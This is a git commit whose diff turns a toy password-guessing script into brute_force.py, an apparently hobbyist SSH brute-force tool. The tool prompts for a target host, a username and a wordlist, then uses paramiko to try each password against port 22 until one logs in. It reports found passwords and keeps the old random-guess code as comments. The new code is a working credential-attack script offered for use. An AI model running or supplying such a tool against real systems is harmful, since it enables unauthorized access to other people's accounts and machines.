e56d6157e65568fdaabefc2dc2eeef976894ae28
eliarshin <elikarshin@gmail.com>
2022-02-09 21:48:00 +0200

    brute force on ssh

--- brute_force.py
+++ brute_force.py
@@ -1,16 +1,60 @@
-import random
-import pyautogui
+import paramiko, sys , os , socket 
+import threading, time
 
-chars = "abcdefghijklmnopqrstuvwxyz0123456789"
-char_list = list(chars)
+# this is bruteforce working without threads atm,
+# need to be checked on many machines 
 
-pw = pyautogui.password("Enter a password:")
-guess =""
+stop_flag = 0
 
-while(guess != pw):
-    guess = random.choices(char_list, k =len(pw))
-    print("<======"+str(guess)+"======>")
+def ssh_connect(password, code=0):
+    ssh = paramiko.SSHClient() #init
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy) #init
 
-    if(guess == list(pw)):
-        print("your password is : "+ "".join(guess))
-        break
+    try:
+        ssh.connect(host, port=22, username=username, password=password)
+    except paramiko.AuthenticationException: #wrong password
+        code = 1
+    except socket.error as e: # any other error
+        code = 2
+    ssh.close()
+    return code
+
+
+host = input('[+] Target Address: ')
+username = input('[+] SSH Username: ')
+input_file = input('[+] Passwords File: ')
+
+#check if file exsist
+if os.path.exists(input_file) == False:
+    print('[---]That File/Path Doest Exsist[---]')
+    sys.exit(1)
+
+with open(input_file, 'r') as file:
+    for line in file.readlines():
+        password = line.strip()
+        try:
+            response = ssh_connect(password)
+            if response == 0: # password found
+                print((('[+] Found Password: ' + password + ' For Account: '+ username), 'green'))
+                break
+            elif response == 1:
+                print('[-] Incorrect Login: '+ password)
+        except Exception as e:
+            print(e)
+            pass
+# import random
+# import pyautogui
+
+# chars = "abcdefghijklmnopqrstuvwxyz0123456789"
+# char_list = list(chars)
+
+# pw = pyautogui.password("Enter a password:")
+# guess =""
+
+# while(guess != pw):
+#     guess = random.choices(char_list, k =len(pw))
+#     print("<======"+str(guess)+"======>")
+
+#     if(guess == list(pw)):
+#         print("your password is : "+ "".join(guess))
+#         break
